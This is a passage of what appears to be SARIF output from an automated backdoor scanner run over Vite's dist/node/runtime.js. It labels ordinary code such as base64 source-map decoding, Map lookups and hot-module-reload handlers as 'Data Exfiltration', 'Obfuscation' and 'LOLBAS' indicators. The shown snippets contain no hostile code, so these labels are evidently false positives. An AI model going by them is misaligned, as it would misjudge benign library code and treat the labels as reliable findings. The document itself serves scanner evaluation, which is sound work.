                      "markdown": "`  }\n  return state.lastKey = key, state.lastNeedle = needle, state.lastIndex = binarySearch(haystack, needle, low, high);\n}\nconst LINE_GTR_ZERO = \"`line` must be greater than 0 (lines start at line 1)\", COL_GTR_EQ_ZERO = \"`column` must be greater than or equal to 0 (columns start at column 0)\", LEAST_UPPER_BOUND = -1, GREATEST_LOWER_BOUND = 1;\nfunction cast(map) {\n  return map;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 821,
                  "startColumn": 127,
                  "endLine": 821,
                  "endColumn": 133,
                  "snippet": {
                    "text": "      );\n    if (typeof process.setSourceMapsEnabled != \"function\")\n      throw new TypeError(\n        `Cannot use \"sourcemapInterceptor: 'node'\" because \"process.setSourceMapsEnabled\" function is not available. Please use Node >= 16.6.0.`\n      );\n    const isEnabledAlready = process.sourceMapsEnabled ?? !1;\n    return process.setSourceMapsEnabled(!0), () => !isEnabledAlready && process.setSourceMapsEnabled(!1);\n",
                    "rendered": {
                      "text": "      );\n    if (typeof process.setSourceMapsEnabled != \"function\")\n      throw new TypeError(\n        `Cannot use \"sourcemapInterceptor: 'node'\" because \"process.setSourceMapsEnabled\" function is not available. Please use Node >= 16.6.0.`\n      );\n    const isEnabledAlready = process.sourceMapsEnabled ?? !1;\n    return process.setSourceMapsEnabled(!0), () => !isEnabledAlready && process.setSourceMapsEnabled(!1);\n",
                      "markdown": "`      );\n    if (typeof process.setSourceMapsEnabled != \"function\")\n      throw new TypeError(\n        `Cannot use \"sourcemapInterceptor: 'node'\" because \"process.setSourceMapsEnabled\" function is not available. Please use Node >= 16.6.0.`\n      );\n    const isEnabledAlready = process.sourceMapsEnabled ?? !1;\n    return process.setSourceMapsEnabled(!0), () => !isEnabledAlready && process.setSourceMapsEnabled(!1);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 676,
                  "startColumn": 42,
                  "endLine": 676,
                  "endColumn": 48,
                  "snippet": {
                    "text": "  let sourceMapData;\n  if (reSourceMap.test(sourceMappingURL)) {\n    const rawData = sourceMappingURL.slice(sourceMappingURL.indexOf(\",\") + 1);\n    sourceMapData = Buffer.from(rawData, \"base64\").toString(), sourceMappingURL = source;\n  } else\n    sourceMappingURL = supportRelativeURL(source, sourceMappingURL), sourceMapData = retrieveFile(sourceMappingURL);\n  return sourceMapData ? {\n",
                    "rendered": {
                      "text": "  let sourceMapData;\n  if (reSourceMap.test(sourceMappingURL)) {\n    const rawData = sourceMappingURL.slice(sourceMappingURL.indexOf(\",\") + 1);\n    sourceMapData = Buffer.from(rawData, \"base64\").toString(), sourceMappingURL = source;\n  } else\n    sourceMappingURL = supportRelativeURL(source, sourceMappingURL), sourceMapData = retrieveFile(sourceMappingURL);\n  return sourceMapData ? {\n",
                      "markdown": "`  let sourceMapData;\n  if (reSourceMap.test(sourceMappingURL)) {\n    const rawData = sourceMappingURL.slice(sourceMappingURL.indexOf(\",\") + 1);\n    sourceMapData = Buffer.from(rawData, \"base64\").toString(), sourceMappingURL = source;\n  } else\n    sourceMappingURL = supportRelativeURL(source, sourceMappingURL), sourceMapData = retrieveFile(sourceMappingURL);\n  return sourceMapData ? {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 667,
                  "startColumn": 49,
                  "endLine": 667,
                  "endColumn": 55,
                  "snippet": {
                    "text": "  for (; match = re.exec(fileData); ) lastMatch = match;\n  return lastMatch ? lastMatch[1] : null;\n}\nconst reSourceMap = /^data:application\\/json[^,]+base64,/;\nfunction retrieveSourceMap(source) {\n  const urlAndMap = retrieveSourceMapFromHandlers(source);\n  if (urlAndMap) return urlAndMap;\n",
                    "rendered": {
                      "text": "  for (; match = re.exec(fileData); ) lastMatch = match;\n  return lastMatch ? lastMatch[1] : null;\n}\nconst reSourceMap = /^data:application\\/json[^,]+base64,/;\nfunction retrieveSourceMap(source) {\n  const urlAndMap = retrieveSourceMapFromHandlers(source);\n  if (urlAndMap) return urlAndMap;\n",
                      "markdown": "`  for (; match = re.exec(fileData); ) lastMatch = match;\n  return lastMatch ? lastMatch[1] : null;\n}\nconst reSourceMap = /^data:application\\/json[^,]+base64,/;\nfunction retrieveSourceMap(source) {\n  const urlAndMap = retrieveSourceMapFromHandlers(source);\n  if (urlAndMap) return urlAndMap;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 72,
                  "endLine": 78,
                  "endColumn": 78,
                  "snippet": {
                    "text": "nst segments = normalizeWindowsPath(p).replace(/\\/$/, \"\").split(\"/\").slice(0, -1);\n  return segments.length === 1 && _DRIVE_LETTER_RE.test(segments[0]) && (segments[0] += \"/\"), segments.join(\"/\") || (isAbsolute(p) ? \"/\" : \".\");\n}, decodeBase64 = typeof atob < \"u\" ? atob : (str) => Buffer.from(str, \"base64\").toString(\"utf-8\"), CHAR_FORWARD_SLASH = 47, CHAR_BACKWARD_SLASH = 92, percentRegEx = /%/g, backslashRegEx = /\\\\/g, newlineRegEx = /\\n/g, carriageReturnRegEx = /\\r/g, tabRegEx = /\\t/g, questionRegex = /\\?/g, hashRegex = /#/g;\nfunction encodePathChars(filepath) {\n  return filepath.indexOf(\"%\") !== ",
                    "rendered": {
                      "text": "nst segments = normalizeWindowsPath(p).replace(/\\/$/, \"\").split(\"/\").slice(0, -1);\n  return segments.length === 1 && _DRIVE_LETTER_RE.test(segments[0]) && (segments[0] += \"/\"), segments.join(\"/\") || (isAbsolute(p) ? \"/\" : \".\");\n}, decodeBase64 = typeof atob < \"u\" ? atob : (str) => Buffer.from(str, \"base64\").toString(\"utf-8\"), CHAR_FORWARD_SLASH = 47, CHAR_BACKWARD_SLASH = 92, percentRegEx = /%/g, backslashRegEx = /\\\\/g, newlineRegEx = /\\n/g, carriageReturnRegEx = /\\r/g, tabRegEx = /\\t/g, questionRegex = /\\?/g, hashRegex = /#/g;\nfunction encodePathChars(filepath) {\n  return filepath.indexOf(\"%\") !== ",
                      "markdown": "`nst segments = normalizeWindowsPath(p).replace(/\\/$/, \"\").split(\"/\").slice(0, -1);\n  return segments.length === 1 && _DRIVE_LETTER_RE.test(segments[0]) && (segments[0] += \"/\"), segments.join(\"/\") || (isAbsolute(p) ? \"/\" : \".\");\n}, decodeBase64 = typeof atob < \"u\" ? atob : (str) => Buffer.from(str, \"base64\").toString(\"utf-8\"), CHAR_FORWARD_SLASH = 47, CHAR_BACKWARD_SLASH = 92, percentRegEx = /%/g, backslashRegEx = /\\\\/g, newlineRegEx = /\\n/g, carriageReturnRegEx = /\\r/g, tabRegEx = /\\t/g, questionRegex = /\\?/g, hashRegex = /#/g;\nfunction encodePathChars(filepath) {\n  return filepath.indexOf(\"%\") !== `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 955,
                  "startColumn": 42,
                  "endLine": 955,
                  "endColumn": 47,
                  "snippet": {
                    "text": "in fetchedModule ? fetchedModule.file : void 0, fullFile = file ? `${file}${query}` : id, moduleId = this.moduleCache.normalize(fullFile), mod = this.moduleCache.getByModuleId(moduleId);\n    if (fetchedModule.id = moduleId, mod.meta = fetchedModule, file) {\n      const fileModules = this.fileToIdMap.get(file) || [];\n      fileModules.push(moduleId), this.fileToIdMap.set(file, fileModules);\n    }\n    return this.idToUrlMap.set(id, moduleId), this.idToUrlMap.set(unwrapId(id), moduleId), fetchedModule;\n  }\n  // override is allowed, consider this a public API\n  async directRequest(id, fetchResult, _cal",
                    "rendered": {
                      "text": "in fetchedModule ? fetchedModule.file : void 0, fullFile = file ? `${file}${query}` : id, moduleId = this.moduleCache.normalize(fullFile), mod = this.moduleCache.getByModuleId(moduleId);\n    if (fetchedModule.id = moduleId, mod.meta = fetchedModule, file) {\n      const fileModules = this.fileToIdMap.get(file) || [];\n      fileModules.push(moduleId), this.fileToIdMap.set(file, fileModules);\n    }\n    return this.idToUrlMap.set(id, moduleId), this.idToUrlMap.set(unwrapId(id), moduleId), fetchedModule;\n  }\n  // override is allowed, consider this a public API\n  async directRequest(id, fetchResult, _cal",
                      "markdown": "`in fetchedModule ? fetchedModule.file : void 0, fullFile = file ? `${file}${query}` : id, moduleId = this.moduleCache.normalize(fullFile), mod = this.moduleCache.getByModuleId(moduleId);\n    if (fetchedModule.id = moduleId, mod.meta = fetchedModule, file) {\n      const fileModules = this.fileToIdMap.get(file) || [];\n      fileModules.push(moduleId), this.fileToIdMap.set(file, fileModules);\n    }\n    return this.idToUrlMap.set(id, moduleId), this.idToUrlMap.set(unwrapId(id), moduleId), fetchedModule;\n  }\n  // override is allowed, consider this a public API\n  async directRequest(id, fetchResult, _cal`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 946,
                  "startColumn": 38,
                  "endLine": 946,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  async cachedModule(id, importer) {\n    if (this._destroyed)\n      throw new Error(\"[vite] Vite runtime has been destroyed.\");\n    const normalized = this.idToUrlMap.get(id);\n    if (normalized) {\n      const mod2 = this.moduleCache.getByModuleId(normalized);\n      if (mod2.meta)\n",
                    "rendered": {
                      "text": "  async cachedModule(id, importer) {\n    if (this._destroyed)\n      throw new Error(\"[vite] Vite runtime has been destroyed.\");\n    const normalized = this.idToUrlMap.get(id);\n    if (normalized) {\n      const mod2 = this.moduleCache.getByModuleId(normalized);\n      if (mod2.meta)\n",
                      "markdown": "`  async cachedModule(id, importer) {\n    if (this._destroyed)\n      throw new Error(\"[vite] Vite runtime has been destroyed.\");\n    const normalized = this.idToUrlMap.get(id);\n    if (normalized) {\n      const mod2 = this.moduleCache.getByModuleId(normalized);\n      if (mod2.meta)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 898,
                  "startColumn": 34,
                  "endLine": 898,
                  "endColumn": 39,
                  "snippet": {
                    "text": "  }\n  invalidateFiles(files) {\n    files.forEach((file) => {\n      const ids = this.fileToIdMap.get(file);\n      ids && ids.forEach((id) => this.moduleCache.invalidate(id));\n    });\n  }\n",
                    "rendered": {
                      "text": "  }\n  invalidateFiles(files) {\n    files.forEach((file) => {\n      const ids = this.fileToIdMap.get(file);\n      ids && ids.forEach((id) => this.moduleCache.invalidate(id));\n    });\n  }\n",
                      "markdown": "`  }\n  invalidateFiles(files) {\n    files.forEach((file) => {\n      const ids = this.fileToIdMap.get(file);\n      ids && ids.forEach((id) => this.moduleCache.invalidate(id));\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 503,
                  "startColumn": 45,
                  "endLine": 503,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      disposer && await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n      } catch (e) {\n",
                    "rendered": {
                      "text": "    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      disposer && await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n      } catch (e) {\n",
                      "markdown": "`    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      disposer && await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n      } catch (e) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 502,
                  "startColumn": 38,
                  "endLine": 502,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      ({ deps }) => deps.includes(acceptedPath)\n    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      disposer && await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n",
                    "rendered": {
                      "text": "      ({ deps }) => deps.includes(acceptedPath)\n    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      disposer && await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n",
                      "markdown": "`      ({ deps }) => deps.includes(acceptedPath)\n    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      disposer && await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 494,
                  "startColumn": 67,
                  "endLine": 494,
                  "endColumn": 72,
                  "snippet": {
                    "text": "    }\n  }\n  async fetchUpdate(update) {\n    const { path, acceptedPath } = update, mod = this.hotModulesMap.get(path);\n    if (!mod)\n      return;\n    let fetchedModule;\n",
                    "rendered": {
                      "text": "    }\n  }\n  async fetchUpdate(update) {\n    const { path, acceptedPath } = update, mod = this.hotModulesMap.get(path);\n    if (!mod)\n      return;\n    let fetchedModule;\n",
                      "markdown": "`    }\n  }\n  async fetchUpdate(update) {\n    const { path, acceptedPath } = update, mod = this.hotModulesMap.get(path);\n    if (!mod)\n      return;\n    let fetchedModule;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 471,
                  "startColumn": 27,
                  "endLine": 471,
                  "endColumn": 32,
                  "snippet": {
                    "text": "      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      fn && fn(this.dataMap.get(path));\n    });\n  }\n  warnFailedUpdate(err, path) {\n",
                    "rendered": {
                      "text": "      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      fn && fn(this.dataMap.get(path));\n    });\n  }\n  warnFailedUpdate(err, path) {\n",
                      "markdown": "`      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      fn && fn(this.dataMap.get(path));\n    });\n  }\n  warnFailedUpdate(err, path) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 470,
                  "startColumn": 30,
                  "endLine": 470,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      fn && fn(this.dataMap.get(path));\n    });\n  }\n",
                    "rendered": {
                      "text": "        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      fn && fn(this.dataMap.get(path));\n    });\n  }\n",
                      "markdown": "`        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      fn && fn(this.dataMap.get(path));\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 467,
                  "startColumn": 50,
                  "endLine": 467,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n",
                    "rendered": {
                      "text": "    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n",
                      "markdown": "`    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 466,
                  "startColumn": 40,
                  "endLine": 466,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  async prunePaths(paths) {\n    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n",
                    "rendered": {
                      "text": "  async prunePaths(paths) {\n    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n",
                      "markdown": "`  async prunePaths(paths) {\n    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    ), paths.forEach((path) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 454,
                  "startColumn": 39,
                  "endLine": 454,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  ctxToListenersMap = /* @__PURE__ */ new Map();\n  messenger;\n  async notifyListeners(event, data) {\n    const cbs = this.customListenersMap.get(event);\n    cbs && await Promise.allSettled(cbs.map((cb) => cb(data)));\n  }\n  clear() {\n",
                    "rendered": {
                      "text": "  ctxToListenersMap = /* @__PURE__ */ new Map();\n  messenger;\n  async notifyListeners(event, data) {\n    const cbs = this.customListenersMap.get(event);\n    cbs && await Promise.allSettled(cbs.map((cb) => cb(data)));\n  }\n  clear() {\n",
                      "markdown": "`  ctxToListenersMap = /* @__PURE__ */ new Map();\n  messenger;\n  async notifyListeners(event, data) {\n    const cbs = this.customListenersMap.get(event);\n    cbs && await Promise.allSettled(cbs.map((cb) => cb(data)));\n  }\n  clear() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 420,
                  "startColumn": 44,
                  "endLine": 420,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  }\n  acceptDeps(deps, callback = () => {\n  }) {\n    const mod = this.hmrClient.hotModulesMap.get(this.ownerPath) || {\n      id: this.ownerPath,\n      callbacks: []\n    };\n",
                    "rendered": {
                      "text": "  }\n  acceptDeps(deps, callback = () => {\n  }) {\n    const mod = this.hmrClient.hotModulesMap.get(this.ownerPath) || {\n      id: this.ownerPath,\n      callbacks: []\n    };\n",
                      "markdown": "`  }\n  acceptDeps(deps, callback = () => {\n  }) {\n    const mod = this.hmrClient.hotModulesMap.get(this.ownerPath) || {\n      id: this.ownerPath,\n      callbacks: []\n    };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 26,
                  "endLine": 401,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  }\n  off(event, cb) {\n    const removeFromMap = (map) => {\n      const existing = map.get(event);\n      if (existing === void 0)\n        return;\n      const pruned = existing.filter((l) => l !== cb);\n",
                    "rendered": {
                      "text": "  }\n  off(event, cb) {\n    const removeFromMap = (map) => {\n      const existing = map.get(event);\n      if (existing === void 0)\n        return;\n      const pruned = existing.filter((l) => l !== cb);\n",
                      "markdown": "`  }\n  off(event, cb) {\n    const removeFromMap = (map) => {\n      const existing = map.get(event);\n      if (existing === void 0)\n        return;\n      const pruned = existing.filter((l) => l !== cb);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 26,
                  "endLine": 394,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  }\n  on(event, cb) {\n    const addToMap = (map) => {\n      const existing = map.get(event) || [];\n      existing.push(cb), map.set(event, existing);\n    };\n    addToMap(this.hmrClient.customListenersMap), addToMap(this.newListeners);\n",
                    "rendered": {
                      "text": "  }\n  on(event, cb) {\n    const addToMap = (map) => {\n      const existing = map.get(event) || [];\n      existing.push(cb), map.set(event, existing);\n    };\n    addToMap(this.hmrClient.customListenersMap), addToMap(this.newListeners);\n",
                      "markdown": "`  }\n  on(event, cb) {\n    const addToMap = (map) => {\n      const existing = map.get(event) || [];\n      existing.push(cb), map.set(event, existing);\n    };\n    addToMap(this.hmrClient.customListenersMap), addToMap(this.newListeners);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 357,
                  "startColumn": 33,
                  "endLine": 357,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  }\n  newListeners;\n  get data() {\n    return this.hmrClient.dataMap.get(this.ownerPath);\n  }\n  accept(deps, callback) {\n    if (typeof deps == \"function\" || !deps)\n",
                    "rendered": {
                      "text": "  }\n  newListeners;\n  get data() {\n    return this.hmrClient.dataMap.get(this.ownerPath);\n  }\n  accept(deps, callback) {\n    if (typeof deps == \"function\" || !deps)\n",
                      "markdown": "`  }\n  newListeners;\n  get data() {\n    return this.hmrClient.dataMap.get(this.ownerPath);\n  }\n  accept(deps, callback) {\n    if (typeof deps == \"function\" || !deps)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/runtime.js"
                },
                "region": {
                  "startLine": 347,
                  "startColumn": 54,
                  "endLine": 347,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n        listeners && hmrClient.customListenersMap.set(\n          event,\n          listeners.filter((l) => !staleFns.includes(l))\n",
                    "rendered": {
                      "text": "    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n        listeners && hmrClient.customListenersMap.set(\n          event,\n          listeners.filter((l) => !staleFns.includes(l))\n",
                      "markdown": "`    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners)\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n        listeners && hmrClient.customListenersMap.set(\n          event,\n          listeners.filter((l) => !staleFns.includes(l))\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
